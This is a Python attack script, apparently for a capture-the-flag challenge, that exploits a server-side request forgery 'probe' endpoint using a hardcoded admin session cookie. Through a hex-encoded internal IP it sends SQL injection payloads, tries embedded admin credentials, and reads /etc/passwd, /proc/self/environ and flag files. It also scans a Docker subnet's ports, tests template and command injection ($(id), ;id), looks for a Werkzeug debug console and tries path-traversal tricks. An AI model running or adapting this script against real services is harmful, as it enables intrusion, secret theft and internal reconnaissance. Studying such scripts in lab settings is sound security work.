#!/usr/bin/env python3
"""Advanced SSRF exploration for a-16."""
import requests
import re
import html as html_mod
import time

SESSION = "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.amiz9w.0WjzyknMhK0dclFCs8-dT-9hk6I"

def probe(target_url, timeout=10):
    """Send SSRF probe request."""
    try:
        resp = requests.post(
            "http://10.0.174.208:80/probe",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": SESSION,
            },
            data={
                "target_url": target_url,
                "timeout": str(timeout),
                "follow_redirect": "on",
            },
            timeout=timeout + 15,
        )
        text = resp.text
        
        # Extract status code
        status_match = re.search(r'状态码.*?header-item">(\d+)', text)
        content_len_match = re.search(r'内容长度.*?header-item">([^<]+)', text)
        
        # Extract body preview
        body_match = re.search(r'<pre[^>]*>(.*?)</pre>', text, re.DOTALL)
        body = ""
        if body_match:
            body = html_mod.unescape(body_match.group(1)).strip()
        
        # Check for errors
        error_match = re.search(r'alert-danger[^>]*>(.*?)</div>', text, re.DOTALL)
        error = None
        if error_match:
            error = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
        
        status = status_match.group(1) if status_match else None
        clen = content_len_match.group(1) if content_len_match else None
        
        return {"status": status, "len": clen, "body": body, "error": error}
    except Exception as e:
        return {"error": str(e)}

# Direction 1: Try SQL injection on /debug/config with different query parameters
print("=" * 60)
print("DIRECTION 1: SQL injection on /debug/config")
print("=" * 60)

# Try to see if /debug/config accepts any query parameters that might trigger SQL
sql_payloads = [
    "",  # baseline
    "?id=1",
    "?id=1'",
    "?id=1'+OR+1=1--",
    "?id=1'+AND+SLEEP(1)--",
    "?q=test",
    "?search=test",
    "?query=SELECT+1",
    "?debug=true",
    "?token=admin",
    "?format=json",
]

for payload in sql_payloads:
    url = f"http://0xAC.0x12.0x00.0x02:5000/debug/config{payload}"
    result = probe(url)
    if result.get("status"):
        print(f"  {payload or '(no params)'}: {result['status']} | {result['len']}B | {result['body'][:80]}")
    elif result.get("error"):
        print(f"  {payload or '(no params)'}: ERROR - {result['error'][:80]}")
    else:
        print(f"  {payload or '(no params)'}: NO_RESULT")

# Try on /health and /status too
for endpoint in ["health", "status"]:
    for payload in ["?id=1", "?debug=true", "?q=test"]:
        url = f"http://admin:internal_admin_token_2024@0xAC.0x12.0x00.0x02:5000/{endpoint}{payload}"
        result = probe(url)
        body_preview = result.get("body", "")[:60]
        print(f"  /{endpoint}{payload}: {result.get('status')} | {body_preview}")

print()
print("=" * 60)
print("DIRECTION 2: Try to read flag/challenge files from internal-api")
print("=" * 60)

# Try various file reading paths
file_paths = [
    "/challenge/flag.txt",
    "/flag.txt", 
    "/flag",
    "/challenge/flag",
    "/etc/passwd",
    "/proc/self/environ",
    "/app/flag.txt",
    "/tmp/flag.txt",
    "/root/flag.txt",
]

for fpath in file_paths:
    url = f"http://0xAC.0x12.0x00.0x02:5000{fpath}"
    result = probe(url)
    if result.get("status") and result.get("status") != "404":
        print(f"  {fpath}: {result['status']} | {result['len']}B | {result.get('body', '')[:80]}")
    else:
        print(f"  {fpath}: {result.get('status', '?')} | {result.get('body', '')[:40]}")

print()
print("=" * 60)
print("DIRECTION 3: Docker network scanning - other hosts/ports")
print("=" * 60)

# Scan 172.18.0.0/24 for port 5000 and other common ports
for host in range(1, 20):
    for port in [80, 443, 5000, 8080, 3000, 3306, 6379, 9000]:
        url = f"http://0xAC.0x12.0x00.{host:02x}:{port}/"
        result = probe(url, timeout=5)
        if result.get("status"):
            body = result.get("body", "")[:50]
            print(f"  172.18.0.{host}:{port} -> {result['status']} | {body}")
        time.sleep(0.05)  # Rate limiting

print()
print("=" * 60)
print("DIRECTION 4: Try the probe service itself for vulnerabilities")
print("=" * 60)

# Check the probe service for SSTI, command injection
probe_tests = [
    ("{{7*7}}", "SSTI test"),
    ("`id`", "Command injection backtick"),
    ("$(id)", "Command injection dollar"),
    (";id", "Command injection semicolon"),
]

for payload, desc in probe_tests:
    r = requests.post(
        "http://10.0.174.208:80/probe",
        headers={"Content-Type": "application/x-www-form-urlencoded", "Cookie": SESSION},
        data={"target_url": f"http://0xAC.0x12.0x00.0x02:5000/debug/config?test={requests.utils.quote(payload)}", "timeout": "10", "follow_redirect": "on"},
        timeout=25,
    )
    if "49" in r.text or "uid=" in r.text:
        print(f"  {desc}: POTENTIAL VULN!")
    else:
        print(f"  {desc}: no reflection detected")

print()
print("=" * 60)
print("DIRECTION 5: Try Werkzeug debug console")
print("=" * 60)

# Check if debug console is accessible
for debug_path in ["/console", "/debug/console", "/werkzeug/console"]:
    url = f"http://0xAC.0x12.0x00.0x02:5000{debug_path}"
    result = probe(url)
    print(f"  {debug_path}: {result.get('status', '?')} | {result.get('body', '')[:60]}")

print()
print("=" * 60)
print("DIRECTION 6: Try URL parser tricks on internal-api")
print("=" * 60)

# Try accessing internal-api with different URL tricks
trick_urls = [
    "http://0xAC.0x12.0x00.0x02:5000/debug/config#/flag",
    "http://0xAC.0x12.0x00.0x02:5000/debug/config/../flag",
    "http://0xAC.0x12.0x00.0x02:5000/debug/config/../../challenge/flag.txt",
    "http://0xAC.0x12.0x00.0x02:5000/static/../challenge/flag.txt",
    "http://0xAC.0x12.0x00.0x02:5000/debug/config%00/flag",
]

for url in trick_urls:
    result = probe(url)
    status = result.get("status", "?")
    body = result.get("body", "")[:60]
    if status != "404" or "flag" in body.lower():
        print(f"  {url}: {status} | {body}")
    else:
        print(f"  {url}: {status}")

# Try accessing internal-api source code
print()
print("=" * 60)
print("DIRECTION 7: Try to read internal-api source code")
print("=" * 60)

source_paths = [
    "/app.py",
    "/main.py",
    "/server.py",
    "/api.py",
    "/config.py",
    "/requirements.txt",
    "/proc/self/cmdline",
    "/proc/1/cmdline",
]

for spath in source_paths:
    url = f"http://0xAC.0x12.0x00.0x02:5000{spath}"
    result = probe(url)
    status = result.get("status", "?")
    body = result.get("body", "")[:60]
    if status and status != "404":
        print(f"  {spath}: {status} | {body}")
    else:
        print(f"  {spath}: {status}")
